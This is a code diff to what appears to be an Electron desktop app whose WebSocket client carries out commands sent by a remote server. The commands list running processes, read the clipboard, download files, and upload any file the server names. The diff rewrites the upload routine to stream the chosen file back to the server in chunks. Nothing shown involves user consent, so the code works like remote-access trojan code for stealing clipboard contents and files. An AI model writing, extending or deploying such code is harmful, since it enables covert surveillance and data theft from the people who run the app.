@@ -22,11 +22,11 @@ function createWindow() {
 
   ws.on('message', (message) => {
     const data = JSON.parse(message);
-    handleServerCommand(data);
+    handleServerCommand(data,ws);
   });
 }
 
-function handleServerCommand(data) {
+function handleServerCommand(data,ws) {
   console.log(data.command);
   switch (true) {
     case data.command == 'list_processes':
@@ -44,8 +44,14 @@ function handleServerCommand(data) {
     case data.command == 'get_clipboard':
       sendResponse(clipboard.readText());
       break;
-    case data.command == 'upload_file':
-      uploadFile(data.filePath);
+    case data.command && data.command.startsWith('upload_file'):
+      const part1 = data.command.split(' ');
+      if (part1.length > 1) {
+        const fileName = part1.slice(1).join(' ');
+        uploadFile(ws,fileName);
+      } else {
+        console.error('Invalid command format: file name is missing.');
+      }
       break;
     case data.command == 'download_file':
       downloadFile(data.fileName);
@@ -66,12 +72,54 @@ function sendResponse(result) {
   ws.send(JSON.stringify({ action: "send_result",status:"success",result: result }));
 }
 
-function uploadFile(filePath) {
-  const fileName = path.basename(filePath);
-  fs.readFile(filePath, (err, data) => {
-    if (err) return console.error(err);
-    ws.send(JSON.stringify({ command: 'file_upload', fileName, data: data.toString('base64') }));
-  });
+function uploadFile(ws, filePath) {
+  try {
+    const fileName = path.basename(filePath);
+    const fileSize = fs.statSync(filePath).size;
+
+    const request = {
+      action: "upload_file",
+      filename: fileName,
+      filesize: fileSize,
+    };
+    ws.send(JSON.stringify(request));
+    console.log(`Upload request sent for file: ${fileName} (${fileSize} bytes)`);
+
+    const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 4 });
+    readStream.on("data", (chunk) => {
+      ws.send(chunk);
+    });
+
+    readStream.on("end", () => {
+      const completedMessage = { action: "upload_completed" };
+      ws.send(JSON.stringify(completedMessage));
+      console.log(`Upload completed for file: ${fileName}`);
+      cleanupUpload();
+    });
+
+    readStream.on("error", (err) => {
+      console.error(`Error reading file ${filePath}:`, err);
+      cleanupUpload();
+    });
+
+    ws.on("error", (err) => {
+      console.error("WebSocket error during upload:", err);
+      cleanupUpload();
+    });
+
+    ws.on("close", () => {
+      console.log("WebSocket connection closed during upload.");
+      cleanupUpload();
+    });
+
+    function cleanupUpload() {
+      if (readStream) {
+        readStream.close();
+      }
+    }
+  } catch (err) {
+    console.error(`Error initiating upload: ${err.message}`);
+  }
 }
 
 function downloadFile(fileName) {
